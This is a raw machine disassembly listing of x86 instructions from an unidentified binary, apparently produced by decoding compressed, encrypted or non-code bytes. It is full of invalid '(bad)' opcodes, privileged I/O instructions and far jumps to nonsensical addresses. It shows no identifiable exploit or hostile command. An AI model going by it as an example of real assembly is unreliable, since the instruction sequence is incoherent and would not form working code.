  42dbd9:	cmp    al,BYTE PTR [ebx-0x4753a458]
  42dbdf:	fs (bad) 
  42dbe1:	push   es
  42dbe2:	and    bl,0x77
  42dbe5:	pop    edx
  42dbe6:	fistp  DWORD PTR [ecx]
  42dbe8:	and    cl,cl
  42dbea:	loope  0x42db76
  42dbec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dbed:	xchg   ebp,eax
  42dbee:	sbb    DWORD PTR [ebp+0x55],esi
  42dbf1:	aaa    
  42dbf2:	(bad)  
  42dbf3:	out    dx,al
  42dbf4:	aas    
  42dbf5:	jbe    0x42db96
  42dbf7:	je     0x42dbb0
  42dbf9:	ins    BYTE PTR es:[edi],dx
  42dbfa:	jb     0x42db86
  42dbfc:	fucom  st(2)
  42dbfe:	push   ebp
  42dbff:	jmp    0x42db8d
  42dc01:	sar    BYTE PTR [ecx-0x53],1
  42dc04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc05:	in     al,dx
  42dc06:	dec    esp
  42dc07:	lock pop ebp
  42dc09:	ss sahf 
  42dc0b:	sbb    DWORD PTR [ebx],0x96bdafc9
  42dc11:	sub    eax,0x9c528ac9
  42dc16:	imul   esi,DWORD PTR [edx-0x736b6050],0x35
  42dc1d:	adc    cl,BYTE PTR [ebx+0x6c]
  42dc20:	jmp    0x42dc60
  42dc22:	mov    edx,0xaf216e84
  42dc27:	sbb    edx,DWORD PTR [esi-0x6e]
  42dc2a:	sub    eax,0x880a2e3e
  42dc2f:	test   DWORD PTR [ecx-0x60],ebp
  42dc32:	jnp    0x42dc8a
  42dc34:	or     DWORD PTR [ebp+0x4],edi
  42dc37:	cmp    DWORD PTR [edx+0x31c4b0d0],0x65f5e561
  42dc41:	call   0x8ac3:0x8642e855
  42dc48:	pop    ds
  42dc49:	mov    DWORD PTR [edx-0x40],ebx
  42dc4c:	and    BYTE PTR [eax],0x94
  42dc4f:	dec    eax
  42dc50:	mov    WORD PTR [ebp+ebx*2+0x4e],?
  42dc54:	aas    
  42dc55:	iret   
  42dc56:	push   edi
  42dc57:	int3   
  42dc58:	sysexit 
  42dc5a:	add    DWORD PTR fs:[edi+0x6f],edx
  42dc5e:	mov    dl,0xcf
  42dc60:	xchg   esi,eax
  42dc61:	int    0x3a
  42dc63:	aam    0x4b
  42dc65:	aas    
  42dc66:	call   0x7be94154
  42dc6b:	sub    eax,0xc95f52b4
  42dc70:	jno    0x42dcd8
  42dc72:	sbb    ch,BYTE PTR [edi+0x34be01b1]
  42dc78:	mov    ecx,0xc5b3467e
  42dc7d:	add    bl,BYTE PTR [edi]
  42dc7f:	in     eax,0xd6
  42dc81:	mov    DWORD PTR [eax+0x2469179e],ecx
  42dc87:	dec    ebp
  42dc88:	mov    ah,0x18
  42dc8a:	sahf   
  42dc8b:	icebp  
  42dc8c:	std    
  42dc8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc8e:	fwait
  42dc8f:	push   esp
  42dc90:	lods   al,BYTE PTR ds:[esi]
  42dc91:	xor    al,0x8
  42dc93:	mov    al,ds:0x403687da
  42dc98:	sbb    BYTE PTR [ecx+0x30],bl
  42dc9b:	sub    al,0xc9
  42dc9d:	div    BYTE PTR [ebx+0x10621633]
  42dca3:	or     DWORD PTR [ecx],esp
  42dca5:	jmp    0x53a9e243
  42dcaa:	rcl    al,cl
  42dcac:	or     eax,0x94f7de6a
  42dcb1:	pushf  
  42dcb2:	xor    ebx,DWORD PTR [eax+0x5f66f1d1]
  42dcb8:	xor    eax,0xf6f213d6
  42dcbd:	mov    bl,0x2c
  42dcbf:	xchg   ecx,eax
  42dcc0:	push   ss
  42dcc1:	sbb    DWORD PTR [esi],ebx
  42dcc3:	outs   dx,BYTE PTR ds:[esi]
  42dcc4:	not    DWORD PTR [edx]
  42dcc6:	loopne 0x42dc93
  42dcc8:	inc    edi
  42dcc9:	cwde   
  42dcca:	lea    esi,[esi]
  42dccc:	sahf   
  42dccd:	pushf  
  42dcce:	cmovne ecx,DWORD PTR [ebp+ebx*1+0x44]
  42dcd3:	mov    BYTE PTR [ebp-0x5fb38c10],cl
  42dcd9:	and    al,0xb3
  42dcdb:	xchg   esp,eax
  42dcdc:	(bad)  
  42dcdd:	push   ebp
  42dcde:	sbb    DWORD PTR [ecx+ebx*8-0x24],edx
  42dce2:	ficom  DWORD PTR [ebx-0x49845b6f]
  42dce8:	lods   al,BYTE PTR ds:[esi]
  42dce9:	or     edi,DWORD PTR [ebp+0xb]
  42dcec:	sbb    edx,DWORD PTR [ebp+edx*1-0x23]
  42dcf0:	or     al,bl
  42dcf2:	mov    ebx,0xd3a3ea44
  42dcf7:	jb     0x42dd4e
  42dcf9:	cdq    
  42dcfa:	and    ebp,0xa1088414
  42dd00:	jp     0x9b10e117
  42dd06:	cmp    eax,0x873274e2
  42dd0b:	push   eax
  42dd0c:	aad    0x20
  42dd0e:	adc    ch,ah
  42dd10:	sar    BYTE PTR [ecx+edi*4],cl
  42dd13:	pop    es
  42dd14:	lods   al,BYTE PTR ds:[esi]
  42dd15:	cld    
  42dd16:	ds adc eax,0xe8a3c635
  42dd1c:	call   0xa659b8f1
  42dd21:	sbb    ebx,DWORD PTR [eax+0x593bdf03]
  42dd27:	fcom   QWORD PTR [ebx]
  42dd29:	sbb    al,0xfb
  42dd2b:	ins    DWORD PTR es:[edi],dx
  42dd2c:	lods   eax,DWORD PTR ds:[esi]
  42dd2d:	mov    DWORD PTR [eax-0x48e57ec],esi
  42dd33:	in     al,0xf5
  42dd35:	xchg   DWORD PTR [eax-0x17],ebp
  42dd38:	fstp   DWORD PTR [eax]
  42dd3a:	das    
  42dd3b:	add    eax,0x31dd49ab
  42dd40:	lock call 0xbcd9:0x75798e0b
  42dd48:	jne    0x42dd5a
  42dd4a:	push   ds
  42dd4b:	jmp    0x42dd4c
  42dd4d:	out    dx,eax
  42dd4e:	cwde   
  42dd4f:	jge    0x42dd72
  42dd51:	mov    ecx,eax
  42dd53:	pop    edx
  42dd54:	adc    DWORD PTR [ebx-0x5fa7e0f0],esp
  42dd5a:	or     ecx,DWORD PTR ds:0x9566397
  42dd60:	add    ebx,DWORD PTR [ebx-0x3d89861f]
  42dd66:	fisub  WORD PTR [ebx+ebp*2+0x3d28679d]
  42dd6d:	ror    BYTE PTR [ebx+esi*8+0x7a7c89d2],cl
  42dd74:	push   ds
  42dd75:	in     eax,0x1d
  42dd77:	jg     0x42dd50
  42dd79:	out    0xb7,al
  42dd7b:	or     dh,BYTE PTR [eax+0x4]
  42dd7e:	mov    edi,0xa2089d14
  42dd83:	pop    edx
  42dd84:	imul   ch
  42dd86:	les    esp,FWORD PTR [ebx]
  42dd88:	and    BYTE PTR [ebp+0x2],cl
  42dd8b:	xor    ebx,eax
  42dd8d:	lock push edx
  42dd8f:	sub    eax,0x84b0fe74
  42dd94:	sub    ebp,DWORD PTR [eax+0x30]
  42dd97:	mov    ds:0x9ad5791f,eax
  42dd9c:	bound  ebp,QWORD PTR fs:[edx+0x31]
  42dda0:	sbb    eax,0x1a0ec529
  42dda5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dda6:	shl    BYTE PTR [eax+0x6a7ba12d],cl
  42ddac:	into   
  42ddad:	gs mov esp,0x3b38be16
  42ddb3:	inc    ebx
  42ddb4:	and    al,0x49
  42ddb6:	xor    al,0x1c
  42ddb8:	lahf   
  42ddb9:	call   0x9ef34a0c
  42ddbe:	mov    ebp,DWORD PTR [eax+0x14]
  42ddc1:	aam    0xee
  42ddc3:	xchg   ebx,eax
  42ddc4:	idiv   edx
  42ddc6:	pop    edi
  42ddc7:	pop    edx
  42ddc8:	out    0x5d,al
  42ddca:	mov    al,0xd4
  42ddcc:	mov    esp,0x75df61bd
  42ddd1:	or     BYTE PTR [esi+eiz*8+0x4d],dl
  42ddd5:	cld    
  42ddd6:	fdivr  st,st(7)
  42ddd8:	int    0xc
  42ddda:	dec    esp
  42dddb:	jnp    0x42ddcb
  42dddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ddde:	(bad)  
  42dddf:	fstp   TBYTE PTR [edx-0x5cfbbf06]
  42dde5:	(bad)  
  42dde6:	in     al,dx
  42dde7:	or     ah,BYTE PTR [ebp-0x120f1d86]
  42dded:	inc    eax
  42ddee:	loope  0x42de1e
  42ddf0:	and    ch,BYTE PTR [ecx]
  42ddf2:	fwait
  42ddf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ddf4:	mov    eax,0x5c9e143f
  42ddf9:	lahf   
  42ddfa:	fwait
  42ddfb:	pop    edi
  42ddfc:	aaa    
  42ddfd:	push   0xa0423520
  42de02:	dec    ecx
  42de03:	(bad)  
  42de04:	call   0xf942:0x9e84b7c8
  42de0b:	jl     0x42ddda
  42de0d:	call   0xb68a:0x95a528ab
  42de14:	imul   DWORD PTR [edi]
  42de16:	add    ebp,DWORD PTR [ebx]
  42de18:	add    edx,edi
  42de1a:	mov    edi,0x84340114
  42de1f:	pushf  
  42de20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de21:	dec    edi
  42de22:	cmpps  xmm4,XMMWORD PTR ds:0xfee56b43,0xc1
  42de2a:	adc    eax,0x539cc019
  42de2f:	cwde   
  42de30:	jo     0x42ddd2
  42de32:	inc    ecx
  42de33:	fs dec esi
  42de35:	and    al,0x5f
  42de37:	push   cs
  42de38:	(bad)  
  42de39:	loope  0x42de26
  42de3b:	std    
  42de3c:	sbb    dh,cl
  42de3e:	adc    ebp,DWORD PTR [edx]
  42de40:	jp     0x42de33
  42de42:	loopne 0x42de62
  42de44:	js     0x42de2b
  42de46:	mov    cl,0xf4
  42de48:	jne    0x42de19
  42de4a:	jp     0x42de80
  42de4c:	mov    ebp,0xbcaa4bb3
  42de51:	js     0x42dec6
  42de53:	mov    edi,0xf4b21b5
  42de58:	(bad)  
  42de59:	fstp   DWORD PTR [edx]
  42de5b:	add    dh,BYTE PTR [edi-0x2dd39477]
  42de61:	idiv   DWORD PTR [esi-0x6bffeadb]
  42de67:	repz call 0x5ad03ac2
  42de6d:	js     0x42de9f
  42de6f:	ins    DWORD PTR es:[edi],dx
  42de70:	xchg   DWORD PTR [ebx-0x2a],eax
  42de73:	mov    ah,0x11
  42de75:	aam    0x1
  42de77:	into   
  42de78:	and    DWORD PTR [ecx+0x29955e1e],edx
  42de7e:	mov    bl,0x2e
  42de80:	adc    eax,0x30e56eba
  42de85:	stc    
  42de86:	je     0x42de2a
  42de88:	fstp   TBYTE PTR [edx-0x52e6b530]
  42de8e:	ja     0x42de19
  42de90:	mov    dl,0x92
  42de92:	in     eax,0x2e
  42de94:	enter  0x28b5,0xc7
  42de98:	add    eax,0x61f2a4d1
  42de9d:	pop    edx
  42de9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de9f:	cdq    
  42dea0:	pop    es
  42dea1:	fidiv  DWORD PTR [esp+edx*4+0x79813b34]
  42dea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dea9:	std    
  42deaa:	data16 clc 
  42deac:	xor    dl,BYTE PTR ds:0xeba21b72
  42deb2:	shr    DWORD PTR [esp+eax*2],cl
  42deb5:	mov    edx,0xb91f33be
  42deba:	cmp    eax,0x358dce1b
  42debf:	lahf   
  42dec0:	aaa    
  42dec1:	es mov edi,0x253a5dd2
  42dec7:	jmp    0x42df16
  42dec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42deca:	push   es
  42decb:	xchg   ecx,eax
  42decc:	scas   eax,DWORD PTR es:[edi]
  42decd:	xor    ecx,0x2b74d625
  42ded3:	aam    0xcf
  42ded5:	enter  0xe622,0x16
  42ded9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42deda:	pop    ebx
  42dedb:	mov    ah,0xe
  42dedd:	test   eax,0x2cf118cd
  42dee2:	pop    esp
  42dee3:	ss jle 0x42dee5
  42dee6:	mov    edi,0x365fa6d4
  42deeb:	call   0xaf5ecffd
  42def0:	nop
  42def1:	repnz sub al,0xa1
  42def4:	inc    ebp
  42def5:	inc    esi
  42def6:	sub    al,0xf4
  42def8:	xchg   esi,eax
  42def9:	outs   dx,BYTE PTR ds:[esi]
  42defa:	mov    al,0x96
  42defc:	test   BYTE PTR [ebx-0x383a5b3f],dh
  42df02:	idiv   DWORD PTR [edi]
  42df04:	iret   
  42df05:	xchg   BYTE PTR [edx+0x73],ch
  42df08:	push   esi
  42df09:	dec    ecx
  42df0a:	pop    eax
  42df0b:	sbb    edx,DWORD PTR [ecx+0x7f]
  42df0e:	jl     0x42df5c
  42df10:	jl     0x42df40
  42df12:	cmp    al,0x60
  42df14:	rcr    BYTE PTR [esi+0x215fb4bf],cl
  42df1a:	cmp    eax,DWORD PTR [esi+0x316051f6]
  42df20:	xlat   BYTE PTR ds:[ebx]
  42df21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df22:	push   ebx
  42df23:	xchg   ebx,eax
  42df24:	fptan  
  42df26:	push   ebp
  42df27:	fisubr DWORD PTR [ebx-0x12]
  42df2a:	mov    edi,0x3083d914
  42df2f:	push   cs
  42df30:	xchg   ebp,eax
  42df31:	pop    esp
  42df33:	out    0xdd,al
  42df35:	mov    ebx,DWORD PTR [edi]
  42df37:	std    
  42df38:	jnp    0x42df4a
  42df3a:	pushf  
  42df3b:	call   0x62f5a89c
  42df40:	rcl    BYTE PTR [edi+0x29ca0bf0],1
  42df46:	mov    al,0x8c
  42df48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df49:	(bad)  
  42df4a:	sbb    esp,esi
  42df4c:	adc    al,0x98
  42df4e:	js     0x42dee3
  42df50:	into   
  42df51:	dec    esp
  42df52:	ror    BYTE PTR [esi],0xfd
  42df55:	xor    eax,0xb0a9ee52
  42df5a:	icebp  
  42df5b:	in     eax,dx
  42df5c:	std    
  42df5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df5e:	jmp    0x42df0c
  42df60:	addr16 push edi
  42df62:	cmp    eax,0x39947533
  42df67:	xchg   DWORD PTR [esi-0x7e],ecx
  42df6a:	mov    esi,0xe8b4f0d4
  42df6f:	outs   dx,BYTE PTR ds:[esi]
  42df70:	push   ebp
  42df71:	pushf  
  42df72:	aam    0xf2
  42df74:	jge    0x42dfb5
  42df76:	jg     0x42df0e
  42df78:	xchg   ecx,eax
  42df79:	imul   edi,ebx,0x84c16061
  42df7f:	cmp    DWORD PTR [ecx+0x797bed14],0x556af668
  42df89:	jl     0x42dfcc
  42df8b:	out    0x99,al
  42df8d:	sahf   
  42df8e:	out    0x40,eax
  42df90:	cmp    eax,0xfc03fc80
  42df95:	jge    0x42df22
  42df97:	repnz in al,0x95
  42df9a:	mov    ah,0xc
  42df9c:	sbb    BYTE PTR [ecx],cl
  42df9e:	loop   0x42dfd7
  42dfa0:	into   
  42dfa1:	scas   al,BYTE PTR es:[edi]
  42dfa2:	push   edi
  42dfa3:	or     al,BYTE PTR [ecx-0x3aead464]
  42dfa9:	gs retf 
  42dfab:	mov    ah,0x12
  42dfad:	das    
  42dfae:	mov    eax,0xbbfc24fb
  42dfb3:	les    ecx,FWORD PTR [eax]
  42dfb5:	add    BYTE PTR [ebp-0x81919d5],cl
  42dfbb:	retf   0xef1e
  42dfbe:	or     al,0x59
  42dfc0:	aad    0xfd
  42dfc2:	aam    0xd7
  42dfc4:	adc    ebp,DWORD PTR [eax+0x78c9484a]
  42dfca:	mov    ch,0x24
  42dfcc:	bound  esp,QWORD PTR [esi-0x6e]
  42dfcf:	jge    0x42df86
  42dfd1:	sar    BYTE PTR [ecx+0x34d927ec],cl
  42dfd7:	cmp    esp,DWORD PTR [eax]
  42dfd9:	cmp    esp,esp
  42dfdb:	mov    edi,0x3853d7cd
  42dfe0:	outs   dx,DWORD PTR ds:[esi]
  42dfe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dfe2:	dec    ebx
  42dfe3:	pusha  
  42dfe4:	jp     0x42dff1
  42dfe6:	xor    al,0x74
  42dfe8:	jne    0x42dfef
  42dfea:	js     0x42dffe
  42dfec:	xchg   BYTE PTR [ebp+0x59d084b9],al
  42dff2:	xor    DWORD PTR [ecx-0x1e37a70a],0x4a
  42dff9:	loope  0x42dff2
  42dffb:	adc    eax,0x41716697
  42e000:	and    al,0x78
  42e002:	jecxz  0x42dfa0
  42e004:	neg    BYTE PTR [esi-0x41]
  42e007:	hlt    
  42e008:	dec    ebp
  42e009:	js     0x42dfdf
  42e00b:	into   
  42e00c:	out    0xdd,al
  42e00e:	push   eax
  42e00f:	pop    ss
  42e010:	adc    bl,BYTE PTR [eax]
  42e012:	cmp    edi,DWORD PTR [edi+0x3e]
  42e015:	sbb    eax,0xb01811b1
  42e01a:	cmp    ebp,DWORD PTR [ecx-0x31]
  42e01d:	int    0x37
  42e01f:	popa   
  42e020:	sti    
  42e021:	lahf   
  42e022:	jae    0x42e006
  42e024:	and    ch,BYTE PTR [ebx+ebx*1+0xc]
  42e028:	fdiv   DWORD PTR [ebx+0x5db754ba]
  42e02e:	jo     0x42dfe4
  42e030:	aad    0x6c
  42e032:	push   esp
  42e033:	icebp  
  42e034:	pop    ebx
  42e035:	adc    BYTE PTR ds:0x59192230,bl
  42e03b:	and    al,0x45
  42e03d:	mov    ds:0x9c0645a6,al
  42e042:	or     esp,DWORD PTR [ebx-0x4189330]
  42e048:	out    0xa2,eax
  42e04a:	adc    dl,al
  42e04c:	aas    
  42e04d:	add    DWORD PTR [esi-0x1304cf3c],esi
  42e053:	push   esi
  42e054:	xchg   ebp,eax
  42e055:	sbb    al,0x3
  42e057:	repnz ror BYTE PTR [edi-0x56de2310],1
  42e05e:	jp     0x42e004
  42e060:	cmc    
  42e061:	aad    0xbe
  42e063:	sbb    ah,bl
  42e065:	lahf   
  42e066:	jmp    0x42e0c0
  42e068:	cdq    
  42e069:	inc    ebp
  42e06a:	pop    esi
  42e06b:	adc    BYTE PTR [edx-0x44ab2697],dl
  42e071:	jmp    0xf84c352b
  42e076:	adc    ch,0x58
  42e079:	or     cl,bh
  42e07b:	mov    cl,0xa7
  42e07d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e07e:	rcl    ebx,cl
  42e080:	xchg   edx,eax
  42e081:	cmp    dl,al
  42e083:	sub    bh,ah
  42e085:	jl     0x42e07d
  42e087:	pop    edx
  42e088:	ss jg  0x42e02b
  42e08b:	add    BYTE PTR [edx+0x1],dl
  42e08e:	or     eax,0xbb9bddab
  42e093:	mov    bl,0x71
  42e095:	lds    ecx,FWORD PTR [ecx-0x66]
  42e098:	aam    0xc7
  42e09a:	xchg   edx,eax
  42e09b:	(bad)  
  42e09c:	push   eax
  42e09d:	inc    ebp
  42e09e:	mov    cl,0x4
  42e0a0:	js     0x42e023
  42e0a2:	stc    
  42e0a3:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e0a5:	push   edx
  42e0a6:	mov    ah,0xef
  42e0a8:	inc    eax
  42e0a9:	pop    edi
  42e0aa:	jge    0x42e0cc
  42e0ac:	(bad)  
  42e0ad:	mov    esp,0x28b57f4b
  42e0b2:	add    al,0xe5
  42e0b4:	sbb    esi,esp
  42e0b6:	lods   eax,DWORD PTR ds:[esi]
  42e0b7:	jae    0x42e0be
  42e0b9:	xchg   DWORD PTR ds:0x1d2f8ae6,esi
  42e0bf:	stos   DWORD PTR es:[edi],eax
  42e0c0:	xchg   ebx,eax
  42e0c1:	mov    ecx,0x60c7b421
  42e0c6:	outs   dx,DWORD PTR ds:[esi]
  42e0c7:	lea    ebx,[ebp-0x77]
  42e0ca:	mov    ebp,0xf3b796d1
  42e0cf:	push   ds
  42e0d0:	jmp    0xca8b984
  42e0d5:	and    eax,0x38586f3e
  42e0da:	mov    edi,0x20aa0e94
  42e0df:	inc    ch
  42e0e1:	mov    eax,ds:0x4a2fa6db
  42e0e6:	mov    eax,ds:0x97f07a76
  42e0eb:	call   0xfa20:0xc5255ee6
  42e0f2:	mov    fs:0x7a42a5fd,al
  42e0f8:	xor    eax,0x14eb9a23
  42e0fd:	pop    esi
  42e0fe:	and    BYTE PTR [ecx],al
  42e100:	pop    ebp
  42e101:	sbb    esp,DWORD PTR [edx+0x57b91c08]
  42e107:	dec    edi
  42e108:	in     eax,dx
  42e109:	in     eax,0x7d
  42e10b:	lea    esp,[ebp+0x36ef128f]
  42e111:	pop    ecx
  42e112:	pusha  
  42e113:	repz push DWORD PTR [eax+0x302396d0]
  42e11a:	(bad)  
  42e11b:	adc    al,0x36
  42e11d:	add    BYTE PTR [edx+0x31],dl
  42e120:	sbb    eax,0x5e16c93d
  42e125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e126:	dec    ebx
  42e127:	mov    ds:0x2e7d63e7,al
  42e12c:	jmp    0x2ee1659d
  42e131:	imul   edi,DWORD PTR [ebp+0x139c7914],0x72c057d
  42e13b:	in     eax,dx
  42e13c:	imul   edx,DWORD PTR [edi+edi*8],0xf1ecd2cb
  42e143:	mov    fs,WORD PTR [ecx+edi*1]
  42e146:	xchg   ecx,eax
  42e147:	in     al,dx
  42e148:	sti    
  42e149:	push   ds
  42e14a:	sbb    DWORD PTR [ecx-0x9],esi
  42e14d:	fsub   DWORD PTR [edx+0xea3455e]
  42e153:	jmp    0xb58e9360
  42e158:	and    ebp,DWORD PTR [ecx]
  42e15a:	icebp  
  42e15b:	jg     0x42e17d
  42e15d:	xchg   ebx,eax
  42e15e:	dec    ebp
  42e15f:	push   ebx
  42e160:	jne    0x42e183
  42e162:	pop    ebp
  42e163:	adc    al,0xc8
  42e165:	inc    esi
  42e166:	int    0x26
  42e168:	push   ss
  42e169:	stc    
  42e16a:	outs   dx,DWORD PTR ds:[esi]
  42e16b:	add    al,0x69
  42e16d:	(bad)  
  42e16e:	cld    
  42e16f:	jae    0x42e1d2
  42e171:	popf   
  42e172:	sbb    edi,ebx
  42e174:	ins    BYTE PTR es:[edi],dx
  42e175:	and    DWORD PTR [ecx+eiz*4-0x4f],esp
  42e179:	dec    ebx
  42e17a:	pop    ebp
  42e17b:	stos   DWORD PTR es:[edi],eax
  42e17c:	and    al,0x41
  42e17e:	mov    cl,0x14
  42e180:	cmp    eax,0x1d034780
  42e185:	mov    ds:0x35f9d38b,al
  42e18a:	jbe    0x42e130
  42e18c:	sbb    eax,0x6ce43ebc
  42e191:	sahf   
  42e192:	mov    esp,0xad358714
  42e197:	retf   0x2426
  42e19a:	call   0xdd6b:0x829c9660
  42e1a1:	jmp    0xb52b:0x8d276789
  42e1a8:	and    BYTE PTR [ecx-0x620c9e53],dh
  42e1ae:	dec    ebx
  42e1af:	aad    0x91
  42e1b1:	in     eax,dx
  42e1b2:	out    0x3c,eax
  42e1b4:	dec    ecx
  42e1b5:	adc    BYTE PTR [esi-0x5b],bh
  42e1b8:	cli    
  42e1b9:	pop    edx
  42e1ba:	sar    BYTE PTR [ebx+0x51],0xd1
  42e1be:	push   esi
  42e1bf:	mov    edi,0xcd98a5c6
  42e1c4:	addr16 mov edi,0x652c3cfb
  42e1ca:	cmp    eax,ecx
  42e1cc:	sbb    ebp,DWORD PTR [ebp+0x4e]
  42e1cf:	pop    edx
  42e1d0:	sbb    DWORD PTR [ecx-0x33],edi
  42e1d3:	call   0xa201:0x9c78773f
  42e1da:	or     ecx,DWORD PTR ds:0xd9c9ebbf
  42e1e0:	jp     0x42e1ea
  42e1e2:	xchg   edx,eax
  42e1e3:	mov    ?,WORD PTR [ebp-0x3bcb4837]
  42e1e9:	gs ins BYTE PTR es:[edi],dx
  42e1eb:	adc    DWORD PTR [edi+0x6bcd1da],0x33
  42e1f2:	scas   eax,DWORD PTR es:[edi]
  42e1f3:	push   es
  42e1f4:	sbb    al,BYTE PTR [ecx]
  42e1f6:	add    al,0x51
  42e1f8:	(bad)  
  42e1f9:	inc    ebp
  42e1fa:	fisubr DWORD PTR ds:0xa529311f
  42e200:	adc    eax,0xd80f1da2
  42e205:	or     eax,ecx
  42e207:	fmulp  st(5),st
  42e209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e20a:	cmp    ebx,edi
  42e20c:	clc    
  42e20d:	jns    0x42e197
  42e20f:	and    dh,ah
  42e211:	aas    
  42e212:	scas   eax,DWORD PTR es:[edi]
  42e213:	ffree  st(5)
  42e215:	fbstp  TBYTE PTR [eax-0x2a6c21dc]
  42e21b:	gs mov ch,0x16
  42e21e:	or     cl,dh
  42e220:	xor    DWORD PTR [esi-0x18],ebp
  42e223:	jnp    0x42e246
  42e225:	test   eax,0x3c406a37
  42e22a:	in     al,dx
  42e22b:	xchg   ebp,eax
  42e22c:	ins    DWORD PTR es:[edi],dx
  42e22d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e22e:	pop    ebx
  42e22f:	aas    
  42e230:	mov    ebx,0xde0bdf30
  42e235:	add    dl,BYTE PTR [ebp-0x3c]
  42e238:	jae    0x42e245
  42e23a:	popf   
  42e23b:	fsubr  DWORD PTR [edi]
  42e23d:	leave  
  42e23e:	js     0x42e22f
  42e240:	jmp    0x42e252
  42e242:	ins    BYTE PTR es:[edi],dx
  42e243:	push   esp
  42e244:	push   ss
  42e245:	mov    edi,0xb3c5c385
  42e24a:	gs out 0x3a,eax
  42e24d:	dec    ebx
  42e24e:	pushf  
  42e24f:	sub    eax,0x7d2af814
  42e254:	pop    ebp
  42e255:	inc    ecx
  42e256:	sub    al,0xeb
  42e258:	push   ebx
  42e259:	in     al,dx
  42e25a:	out    dx,eax
  42e25b:	jmp    0xcc8f:0xebea6415
  42e262:	inc    ebp
  42e263:	dec    ebx
  42e264:	adc    ecx,DWORD PTR [ebx]
  42e266:	or     DWORD PTR [eax],0x585b5595
  42e26c:	sub    ch,BYTE PTR [edi]
  42e26e:	xor    edi,DWORD PTR [edi+edx*1]
  42e271:	ror    BYTE PTR [edx-0xb],1
  42e274:	(bad)
  42e277:	jmp    0x58f44a47
  42e27c:	sahf   
  42e27d:	jo     0x42e2b0
  42e27f:	xchg   ecx,eax
  42e280:	inc    eax
  42e281:	cwde   
  42e282:	mov    bh,0x14
  42e284:	or     WORD PTR [ebx+0x362e6ada],si
  42e28b:	lods   eax,DWORD PTR ds:[esi]
  42e28c:	push   esp
  42e28d:	fwait
  42e28e:	sbb    edx,DWORD PTR [edi-0x7b]
  42e291:	sbb    BYTE PTR [esi-0x37],0x1e
  42e295:	sub    esi,ecx
  42e297:	psubd  mm1,QWORD PTR [ecx-0x29e89a40]
  42e29e:	cmp    esp,DWORD PTR [esi]
  42e2a0:	or     eax,0xe9e7bf82
  42e2a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e2a6:	ja     0x42e244
  42e2a8:	rol    DWORD PTR [ebx],1
  42e2aa:	loope  0x42e236
  42e2ac:	push   DWORD PTR ds:0x8ac1b8af
  42e2b2:	imul   ecx,DWORD PTR fs:[edi+ebx*4],0x6d
  42e2b7:	daa    
  42e2b8:	inc    esi
  42e2b9:	fmul   st(3),st
  42e2bb:	lods   al,BYTE PTR ds:[esi]
  42e2bc:	lds    esp,FWORD PTR [ebx+0x4260fb00]
  42e2c2:	in     eax,0x46
  42e2c4:	enter  0x3793,0xed
  42e2c8:	(bad)  [ebp+0x28496684]
  42e2ce:	mov    al,0xa4
  42e2d0:	in     al,dx
  42e2d1:	fwait
  42e2d2:	sub    esp,DWORD PTR [edx-0x2e115171]
  42e2d8:	fidivr WORD PTR [edi-0x79877fb4]
  42e2de:	mov    eax,0x45d7a944
  42e2e3:	xchg   ebp,eax
  42e2e4:	or     eax,0x9c8ebd5e
  42e2e9:	mov    bh,0xb7
  42e2eb:	aaa    
  42e2ec:	call   0x7ecb:0xd45ca5c6
  42e2f3:	imul   edi,eax,0x4bb4bbd8
  42e2f9:	mov    BYTE PTR [ecx+0x21],ah
  42e2fc:	aad    0x1a
  42e2fe:	pop    es
  42e2ff:	in     eax,0x1a
  42e301:	out    0xb,eax
  42e303:	cld    
  42e304:	and    ebx,DWORD PTR [ecx]
  42e306:	push   esp
  42e307:	pop    edi
  42e308:	inc    ebp
  42e309:	xlat   BYTE PTR ds:[ebx]
  42e30a:	sub    edx,esp
  42e30c:	pop    edx
  42e30d:	fld    TBYTE PTR [ecx-0x61]
  42e310:	xor    al,0xa6
  42e312:	stos   DWORD PTR es:[edi],eax
  42e313:	lds    esp,FWORD PTR [esp+edx*4]
  42e316:	xchg   esp,eax
  42e317:	jp     0x42e372
  42e319:	ja     0x42e2ae
  42e31b:	in     eax,0x11
  42e31d:	jns    0x42e2d6
  42e31f:	add    al,0x6c
  42e321:	mov    esi,0x68064bab
  42e326:	loope  0x42e347
  42e328:	cld    
  42e329:	popa   
  42e32a:	in     eax,dx
  42e32b:	les    edx,FWORD PTR [eax+0x77]
  42e32e:	mov    esi,0x7c49eea0
  42e333:	push   ss
  42e334:	pop    eax
  42e335:	call   0x3395:0x1fc8f199
  42e33c:	lea    ebp,[eax-0x6053e05]
  42e342:	sbb    BYTE PTR gs:[esi],dl
  42e345:	or     BYTE PTR [ebp+0x1559a993],cl
  42e34b:	xchg   esp,eax
  42e34c:	inc    eax
  42e34d:	out    0x6b,eax
  42e34f:	pop    edi
  42e350:	sbb    BYTE PTR [ebp+0x3bee8aac],al
  42e356:	das    
  42e357:	mov    esp,0x55e88194
  42e35c:	(bad)  
  42e35d:	popf   
  42e35e:	mov    ds,WORD PTR [edx+0x5a]
  42e361:	or     al,0x5
  42e363:	outs   dx,DWORD PTR ds:[esi]
  42e364:	cmc    
  42e365:	fistp  QWORD PTR ds:0x57092caa
  42e36b:	jmp    0x79610e09
  42e370:	je     0x42e38b
